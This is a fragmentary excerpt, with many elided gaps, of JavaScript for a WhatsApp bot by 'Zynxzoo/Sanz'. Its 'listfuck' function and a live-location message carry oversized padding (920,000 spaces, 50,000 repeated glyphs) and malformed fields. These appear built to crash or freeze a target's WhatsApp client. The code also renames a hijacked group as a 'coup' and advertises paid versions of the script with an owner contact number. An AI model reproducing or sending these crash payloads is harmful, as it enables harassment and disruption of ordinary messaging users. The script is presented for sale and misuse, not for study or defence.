...
"𝙎𝙖𝙣𝙕",
"𝙆𝙖𝙡𝙨𝙚𝙡",
"𝙎𝙖𝙣𝙕`𝙆𝙖𝙡𝙨𝙚𝙡 𝙊𝙁𝙁𝙄𝘾𝙄𝘼𝙇"
]
let { key } = await Zynxzoo.sendMessage(m.chat, {text: 'Sanzz'})
...
async function listfuck(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "ジンクスバグ Sanzz"+" ".repeat(920000),
        'footerText': `ジンクスバグ Sanzz ジンクスバグ Sanzz ジンクスバグ Sanzz ジンクスバグ Sanzz ジンクスバグ Sanzz ジンクスバグ Sanzz ジンクスバグ Sanzz`,
        'description': `ジンクスバグ Sanzz ジンクスバグ Sanzz ジンクスバグ Sanzz ジンクスバグ Sanzz ジンクスバグ Sanzz ジンクスバグ Sanzz ジンクスバグ Sanzz`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `ジンクスバグ Sanzz ジンクスバグ Sanzz ジンクスバグ Sanzz ジンクスバグ Sanzz ジンクスバグ Sanzz ジンクスバグ Sanzz ジンクスバグ Sanzz ジンクスバグ Sanzz`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
...
name: "cta_url",
buttonParamsJson: `{
display_text: '𝘾𝙝𝙖𝙣𝙣𝙚𝙡 𝙎𝙖𝙣𝙕 𝙆𝙖𝙡𝙨𝙚𝙡',
url: "${global.url}",
...
await Zynxzoo.groupUpdateSubject(m.chat, '𝙆𝙐𝘿𝙀𝙏𝘼 𝘽𝙔 𝙕𝙔𝙉𝙓𝙕𝙊𝙊')
await Zynxzoo.groupUpdateDescription(m.chat, '𝙆𝙐𝘿𝙀𝙏𝘼 𝘽𝙔 𝙕𝙔𝙉𝙓𝙕𝙊𝙊')
...
let anu = `𝗟𝗜𝗦𝗧 𝗦𝗖𝗥𝗜𝗣𝗧 𝗭𝗬𝗡𝗫𝗭𝗢

𝟭. ᴢʏɴxᴢᴏ ᴠᴇʀsɪᴏɴ ɪx \`𝟲𝟬.𝟬𝟬𝟬\`
𝟮. ᴢʏɴxᴢᴋ ᴠᴇʀsɪᴏɴ ᴠɪɪɪ \`𝟱𝟬.𝟬𝟬𝟬\`
𝟯. ᴢʏɴxᴢᴏ ᴠᴇʀsɪᴏɴ ᴠɪɪ \`𝟯𝟬.𝟬𝟬𝟬\`
𝟰. ᴢʏɴxᴢᴏ ᴠᴇʀsɪᴏɴ ᴠɪ \`𝟮𝟬.𝟬𝟬𝟬\``
	const msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
interactiveMessage: {
						...
						carouselMessage: {
							cards: [{
								...
								nativeFlowMessage: {
									buttons: [{
										name: "cta_url",
										buttonParamsJson: '{"display_text":"Owner","url":"https:\\/\\/wa.me\\/6285805338638?text=Halo+owner+ganteng","webview_presentation":null}',
									}, ],
								},
							}, {
								header: {
								...
								nativeFlowMessage: {
									buttons: [{
										name: "cta_url",
										buttonParamsJson: '{"display_text":"Channel","url":"https://whatsapp.com/channel/0029ValRq0ULikgDaQ5Y0c0L","merchant_url":"https://www.google.com"}',
									}, ],
								},
							}, ],
							messageVersion: 1,
